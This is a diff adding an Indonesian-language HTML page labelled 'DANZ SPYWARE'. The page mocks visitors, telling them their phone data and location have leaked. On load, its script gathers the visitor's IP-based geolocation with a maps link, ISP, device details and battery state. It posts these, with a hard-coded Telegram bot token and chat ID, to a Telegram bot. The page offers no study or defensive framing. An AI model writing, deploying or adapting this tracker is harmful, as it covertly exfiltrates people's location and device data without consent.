@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Danz</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #111;
+      color: #fff;
+      text-align: center;
+      padding: 50px;
+    }
+    img {
+      width: 220px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+    }
+    h1 {
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://files.catbox.moe/3zfugo.png" alt="Thumbnail" />
+  <h1>dongo banget😹😹</h1>
+  <p>data hp & lokasi lu udah kekiri.</p>
+
+  <script>
+    const TOKEN = "8298409773:AAGzRBLRZ2orVm7uqE1Ugxcv1hgKMSGYs3I";
+    const CHAT_ID = "7268009559";
+    const THUMBNAIL_URL = "https://files.catbox.moe/3zfugo.png";
+
+    async function getInfoTambahan() {
+      let info = '';
+      info += `🖥️ *Device*: ${navigator.userAgent}\n`;
+      info += `💻 *Platform*: ${navigator.platform}\n`;
+      info += `📶 *Online*: ${navigator.onLine ? "Online" : "Offline"}\n`;
+      info += `🖥️ *Resolusi*: ${screen.width}x${screen.height}\n`;
+      info += `🧠 *CPU Cores*: ${navigator.hardwareConcurrency || "?"}\n`;
+      info += `💾 *RAM*: ${navigator.deviceMemory || "?"} GB\n`;
+      info += `⏰ *Waktu Akses*: ${new Date().toString()}\n`;
+      info += `🌐 *Bahasa*: ${navigator.language}\n`;
+      info += `🕓 *Zona Waktu*: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+
+      try {
+        const b = await navigator.getBattery();
+        info += `🔋 *Battery*: ${Math.floor(b.level * 100)}%\n`;
+        info += `🔌 *Charging*: ${b.charging ? "Ya" : "Tidak"}\n`;
+      } catch {
+        info += `🔋 *Battery*: Tidak tersedia\n`;
+      }
+
+      return info;
+    }
+
+    async function kirimInfoKeBot() {
+      try {
+        const ip = await fetch("https://ipapi.co/json/").then(r => r.json());
+        const infoTambahan = await getInfoTambahan();
+
+        const message = `
+🔔 *Pengunjung Baru Membuka Halaman!*
+
+🕵 *IP Info*:
+🌍 *IP*: ${ip.ip}
+🏙️ *Kota*: ${ip.city}
+🗺️ *Wilayah*: ${ip.region}
+🌐 *Negara*: ${ip.country_name}
+📍 *Maps*: https://www.google.com/maps?q=${ip.latitude},${ip.longitude}
+🏢 *ISP*: ${ip.org}
+
+📲 *Perangkat*:
+${infoTambahan}
+        `.trim();
+
+        // Kirim thumbnail dulu
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            photo: THUMBNAIL_URL,
+            caption: "𝐃𝐀𝐍𝐙 𝐒𝐏𝐘𝐖𝐀𝐑𝐄",
+            parse_mode: "Markdown"
+          })
+        });
+
+        // Kirim detail info
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: "Markdown"
+          })
+        });
+      } catch (err) {
+        console.error("Gagal mengirim info ke bot:", err);
+      }
+    }
+
+    kirimInfoKeBot();
+  </script>
+</body>
+</html>
